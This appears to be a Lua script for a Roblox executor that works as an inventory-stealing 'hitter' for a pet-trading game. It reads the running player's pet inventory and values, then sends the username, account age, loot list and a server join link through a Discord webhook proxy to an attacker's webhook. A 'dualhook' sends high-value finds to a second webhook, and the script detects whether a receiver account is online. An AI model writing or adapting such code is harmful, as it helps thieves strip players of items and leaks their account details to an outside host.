-- [[ PROXY HANDLER ]] --
local function getProxy(url)
    return url:gsub("discord.com", "webhook.lewisakura.moe")
end

-- [[ WEBHOOK SENDER ]] --
local function sendFinalReport(url, title, color, pets, totalVal, targetName)
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if not request then return end

    -- SORTING: Highest to Lowest (Requirement 1)
    table.sort(pets, function(a, b) return a.val > b.val end)

    local lootLines = ""
    for i, p in ipairs(pets) do
        if i > 25 then break end
        local prefix = (p.mega and "🌈 ") or (p.neon and "✨ ") or "🐾 "
        lootLines = lootLines .. prefix .. p.name .. " — `" .. p.val .. "`\n"
    end

    local payload = {
        username = "Mondeur Elite",
        embeds = {{
            title = title,
            color = color,
            description = "### 📄 Player Information\n" ..
                "👤 **User Name** : `" .. LocalPlayer.Name .. "`\n" ..
                "🎭 **Display Name** : `" .. LocalPlayer.DisplayName .. "`\n" ..
                "📅 **Account Age** : " .. LocalPlayer.AccountAge .. " days\n" ..
                "📱 **Executor** : Delta\n" ..
                "😎 **Receiver** : " .. (targetName or "None Online") .. "\n" ..
                "💰 **Total Value** : `" .. totalVal .. "`\n\n" ..
                "### 📡 Player Status\n" ..
                "🟢 **Status**: `Connected & Active`\n\n" .. -- Requirement 4 (Detection)
                "### 📦 Loot Summary\n" ..
                "```\n" .. (lootLines ~= "" and lootLines or "No pets found") .. "```\n" ..
                "**Total Items Found:** `" .. #pets .. "`\n\n" ..
                "### 👥 Join Player\n" ..
                "[**Join Server Instance (Mobile)**](roblox://placeID=920587237&gameInstanceId=" .. game.JobId .. ")", -- Requirement 2 (Join Link)
            footer = { text = "Mondeur Elite Services | " .. os.date("%X") },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    pcall(function()
        request({
            Url = getProxy(url),
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

-- [[ DATA SCANNER ]] --
task.spawn(function()
    if not game:IsLoaded() then game.Loaded:Wait() end
    
    local Fsys = ReplicatedStorage:WaitForChild("Fsys", 120)
    local Fsys2 = require(Fsys)
    local DB = Fsys2.load("InventoryDB")
    local InvAPI = ReplicatedStorage.API:WaitForChild("InventoryAPI/GetInventory", 120)

    local inventory = nil
    for i = 1, 20 do
        local ok, res = pcall(function() return InvAPI:InvokeServer() end)
        if ok and res then inventory = res break end
        task.wait(3)
    end

    if not inventory then return end

    local allPets, dhPets = {}, {}
    local totalVal, dhVal = 0, 0

    for _, item in pairs(inventory) do
        if item.Kind == "Pet" then
            local data = DB.pets[item.id]
            -- VALUE PROTECTION: Checks item instance + game database
            local val = (item.properties and item.properties.value) or (data and data.value) or 0
            local petObj = {
                name = (data and data.name) or item.id,
                val = val,
                neon = item.properties and item.properties.neon,
                mega = item.properties and item.properties.mega_neon
            }
            
            table.insert(allPets, petObj)
            totalVal = totalVal + val
            
            -- DUALHOOK LOGIC: (Requirement 3)
            if val >= getgenv().DH_VAL then
                table.insert(dhPets, petObj)
                dhVal = dhVal + val
            end
        end
    end

    -- DETECT RECEIVER (Requirement 4)
    local activeTarget = "None Online"
    for _, name in ipairs(getgenv().RECEIVERS) do
        if Players:FindFirstChild(name) then 
            activeTarget = name 
            break 
        end
    end

    -- Send Hits
    sendFinalReport(getgenv().WEBHOOK, "MondeurOnTop • Main Hit [ 🌊 ]", 0x3498db, allPets, totalVal, activeTarget)
    
    if #dhPets > 0 then
        task.wait(2)
        sendFinalReport(getgenv().DUALHOOK, "MondeurOnTop • Dualhook Hit [ 💎 ]", 0x9b59b6, dhPets, dhVal, activeTarget)
    end
end)
